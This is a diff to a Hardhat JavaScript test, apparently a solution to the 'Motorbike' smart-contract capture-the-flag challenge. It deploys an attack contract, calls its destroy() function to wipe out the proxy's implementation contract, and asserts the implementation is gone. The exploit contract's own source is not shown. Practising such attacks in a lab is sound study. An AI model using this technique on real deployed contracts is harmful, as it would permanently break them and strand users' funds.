@@ -5,6 +5,7 @@ let owner, attacker;
 
 describe("Attack", function () {
   it("Should complete the attack", async function () {
+    // SETUP SCENARIO
     [owner, attacker] = await ethers.getSigners();
 
     const Engine = await ethers.getContractFactory("Engine");
@@ -17,12 +18,29 @@ describe("Attack", function () {
 
     expect(await motorbike.address).to.exist;
 
+    // PREPARE AN ATTACK CONTRACT
     const Attack = await ethers.getContractFactory("Attack");
     const attack = await Attack.deploy(engine.address);
     await attack.deployed();
 
-    const tx = await attack.destroy();
-    const receipt = await tx.wait();
-    console.log(receipt);
+    // PROVE THAT PROXY CAN COMMUNICATE WITH IMPLEMENTATION
+    let tx = await attack.validateItIsBroken();
+    let isItBroken = await tx.wait();
+    
+    // Expect the implementation address to return true on "Address.isContract()"
+    let eventsEmitted = isItBroken.events ? isItBroken.events : [];
+    expect(eventsEmitted[0].args?.result).to.true;
+
+    // Run the attack
+    tx = await attack.destroy();
+    let receipt = await tx.wait();
+
+    tx = await attack.validateItIsBroken();
+    isItBroken = await tx.wait()
+    
+    // Expect the implementation address to return false on "Address.isContract()"
+    eventsEmitted = isItBroken.events ? isItBroken.events : [];
+    expect(eventsEmitted[0].args?.result).to.false;
+
   });
 });
